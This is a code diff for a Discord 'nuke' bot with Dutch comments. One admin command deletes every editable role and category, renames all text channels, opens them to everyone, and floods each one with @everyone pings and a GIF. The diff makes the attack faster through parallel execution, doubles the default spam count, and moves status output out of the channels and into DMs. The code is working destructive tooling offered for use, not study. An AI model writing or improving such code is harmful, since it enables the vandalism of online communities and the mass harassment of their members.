@@ -23,16 +23,19 @@ client.on('messageCreate', async message => {
 
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift()?.toLowerCase();
-    const spamAmount = parseInt(args[0]) || 4; // minder spam voor snelheid
+    const spamAmount = parseInt(args[0]) || 8; // standaard 8x spam per channel
 
     if (command === 'all') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply("❌ Administrator rechten nodig!");
         }
 
+        // DM waarschuwing
         try {
-            await message.author.send("⚠️ **SNELLE NUKE** ⚠️\nAlles wordt nu snel aangepast.");
-        } catch {}
+            await message.author.send("⚠️ **SNELLE NUKE START** ⚠️\nRollen + Categorieën verwijderen + Mass spam starten...");
+        } catch (e) {
+            message.reply("❌ Kon geen DM sturen.");
+        }
 
         let cancelled = false;
         const collector = message.channel.createMessageCollector({
@@ -44,52 +47,59 @@ client.on('messageCreate', async message => {
         await new Promise(r => setTimeout(r, 3000));
         if (cancelled) return;
 
-        // 1. Rollen snel verwijderen
-        await message.reply("🗑️ Rollen verwijderen...");
+        // 1. Rollen verwijderen
         for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
-            try { await role.delete(); } catch {} // minimale delay
+            try { await role.delete(); } catch {}
         }
 
         // 2. Categorieën verwijderen
-        await message.channel.send("🗑️ Categorieën verwijderen...");
         for (const category of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
             try { await category.delete(); } catch {}
         }
 
-        // 3. Channels snel aanpassen + spammen
-        await message.channel.send("🚀 Channels hernoemen + spammen...");
-
+        // 3. Channels bewerken + spammen (sneller)
         let processed = 0;
+        const promises = [];
+
         for (const channel of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values()) {
-            try {
-                await channel.setName("Finnson the goat");
+            const p = (async () => {
+                try {
+                    await channel.setName("Finnson the goat");
 
-                // Iedereen zichtbaarheid
-                await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
-                    ViewChannel: true,
-                    SendMessages: true,
-                    ReadMessageHistory: true
-                }).catch(() => {});
+                    await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
+                        ViewChannel: true,
+                        SendMessages: true,
+                        ReadMessageHistory: true
+                    }).catch(() => {});
 
-                // Snelle spam
-                for (let i = 0; i < spamAmount; i++) {
-                    await channel.send(`@everyone\n${GIF_URL}`).catch(() => {});
-                }
+                    // Meer spam
+                    for (let i = 0; i < spamAmount; i++) {
+                        await channel.send(`@everyone\n${GIF_URL}`).catch(() => {});
+                    }
 
-                processed++;
-            } catch (err) {}
+                    processed++;
+                } catch (err) {}
+            })();
+            promises.push(p);
         }
 
-        await message.channel.send(`✅ Klaar! **${processed}** channels aangepast.`);
+        await Promise.all(promises);
+
+        // Finale bericht alleen in DM
+        try {
+            await message.author.send(`[DONE] ${processed} channels changed`);
+        } catch (e) {
+            message.channel.send(`[DONE] ${processed} channels changed`);
+        }
+
         return;
     }
 
-    // Normale delete
+    // Normale .1 delete
     let target = args.length > 0 ? message.mentions.channels.first() : message.channel;
     if (target) {
         try {
             await target.delete();
-            message.reply(`🗑️ **${target.name}** verwijderd.`).catch(() => {});
         } catch {}
     }
 });
